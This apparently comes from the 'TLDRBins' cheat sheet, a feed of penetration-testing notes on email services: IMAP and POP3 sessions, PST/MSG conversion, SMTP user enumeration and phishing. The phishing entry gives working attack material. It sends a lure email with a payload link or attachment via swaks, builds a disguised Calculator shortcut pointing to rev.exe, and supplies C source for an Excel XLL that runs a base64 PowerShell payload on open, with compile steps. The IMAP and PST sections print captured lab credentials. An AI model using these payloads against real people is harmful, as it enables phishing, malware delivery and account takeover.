channel.title: Email on TLDRBins
channel.description: Recent content in Email on TLDRBins

item.title: IMAP
item.description:
IMAP/IMAPS

# Connect to IMAP over ssl
rlwrap openssl s_client -connect <TARGET>:993

$ rlwrap openssl s_client -connect 10.10.10.197:993
Connecting to 10.10.10.197
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US
verify error:num=10:certificate has expired
notAfter=May 14 17:14:21 2021 GMT
verify return:1
depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US
notAfter=May 14 17:14:21 2021 GMT
verify return:1

---
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE AUTH=PLAIN ACL ACL2=UNION ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.

# Login
a LOGIN <USER> <PASSWORD>

a LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
a OK LOGIN Ok.

# List all mailboxes
a LIST "" "*"

a LIST "" "*"
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
a OK LIST completed

# Select a mailbox (e.g. Inbox)
a SELECT <MAIL_BOX>

a SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
a OK [READ-WRITE] Ok

# List all mail IDs
a SEARCH ALL

a SEARCH ALL
* SEARCH 1 2
a OK Search completed (0.001 + 0.000 secs).

# Get mail from mailbox (e.g. #1)
a FETCH <NUM> BODY.PEEK[]

a FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_

t </p></div></body></html>=

item.title: Microsoft Oulook Email Folder
item.description:
Open Email File

Tools

sudo apt install pst-utils

General

# Convert to mbox format
readpst '<PST_FILE>'

$ readpst 'Access Control.pst'
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.

# Open .mbox (plaintext)
cat '<MBOX_FILE>'

$ cat 'Access Control.mbox'
From "john@megacorp.com" Fri Aug 24 07:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-41717394_-_-"


----boundary-LibPST-iamunique-41717394_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-41717394_-_-"

--alt---boundary-LibPST-iamunique-41717394_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-41717394_-_-
---[SNIP]---

Read Many Emails

# Install mutt
sudo apt install mutt

# Open in mutt terminal
mutt -Rf '<MBOX_FILE>'

$ mutt -Rf 'Access Control.mbox'

q:Quit  d:Del  u:Undel  s:Save  m:Mail  r:Reply  g:Group  ?:Help                                                                                                                                                   
   1     Aug 23 john@megacorp.c (  76) MegaCorp Access Control System "security" account

+--------------------------------------+
| Note: Answer No to create /root/Mail |
|                                      |
| Arrow   : Move to the email          |
| Enter   : View email                 |
| q       : back                       |
| q again : quit                       |
+--------------------------------------+

Tools

# Install msgconvert
sudo apt install libemail-outlook-message-perl

# Install formail
sudo apt install procmail

General

# Convert to .eml format
msgconvert *.msg

$ msgconvert *.msg

# Convert to .mbox format
cat <EML_FILE> | formail -b > emails.mbox

$ cat emails.eml | formail -b > emails.mbox

item.title: Phishing
item.description:
Send Email

swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'Check this out: http://<LOCAL_IP>:<PORT>' --attach '@<FILE>'


$obj = New-Object -ComObject WScript.Shell

$link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")

$link.TargetPath = "C:\ProgramData\rev.exe"

$link.Save()

shell.c

#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

1. Compile in Linux

x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32

2. Send Email

swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'This is not a malicious file' --attach '@shell.xll'

Ref: revshells.com

item.title: POP3
item.description:
General

# Connect to POP3 mail server
telnet <TARGET> 110

# Connect with SSL
openssl s_client -connect <TARGET>:995 -crlf -quiet

# Send cmd after +OK
USER <USER>

PASS <PASSWORD>

# List all mails
LIST

# Retrieve mail #1
RETR 1

# Exit Ctrl + ], then
quit

item.title: SMTP
item.description:
Simple Mail Debugging Server

#!/usr/bin/env python3

import aiosmtpd.controller

class CustomSMTPHandler:
    async def handle_DATA(self, server, session, envelope):
        print(f"[+] Received a mail.")
        print("=" * 50)
        print(envelope.content.decode())
        print("=" * 50)
        return "250 OK"

handler = CustomSMTPHandler()
server = aiosmtpd.controller.Controller(handler, hostname="0.0.0.0", port=25)
server.start()
print("[*] Listening on 0.0.0.0:25")
input("[*] Server started. Press Return to quit.\n")
server.stop()

Users Enum

nmap -p 25 --script=smtp-enum-users <TARGET>

# Use RCPT
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t <TARGET>

# Use VRFY
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t <TARGET>

Ref: smtp-user-enum.pl
